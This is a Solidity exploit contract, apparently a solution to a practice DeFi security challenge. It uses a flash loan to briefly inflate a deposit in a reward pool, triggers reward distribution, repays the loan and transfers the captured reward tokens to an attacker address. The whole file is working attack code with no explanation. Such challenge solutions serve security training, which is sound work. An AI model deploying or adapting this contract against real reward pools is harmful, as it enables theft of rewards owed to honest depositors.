// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IFlashLoan {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
    function rewardToken() external returns (address);
}

contract AttackTheRewarder {
    IFlashLoan flashLoan;
    IRewardPool rewardPool;
    IERC20 rewardToken;
    IERC20 DVT;
    address attacker;

    constructor (IFlashLoan _flashLoan, IRewardPool _rewardPool, IERC20 _DVT, address _attacker) {
        flashLoan = _flashLoan;
        rewardPool = _rewardPool;
        rewardToken = IERC20(rewardPool.rewardToken());
        DVT = _DVT;
        attacker = _attacker;
    }

    function attack(uint256 _amount) external {
        flashLoan.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external {
        DVT.approve(address(rewardPool), _amount);
        rewardPool.deposit(_amount);
        rewardPool.distributeRewards();
        rewardPool.withdraw(_amount);
        DVT.transfer(msg.sender, _amount);
        uint amt = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, amt);
    }
}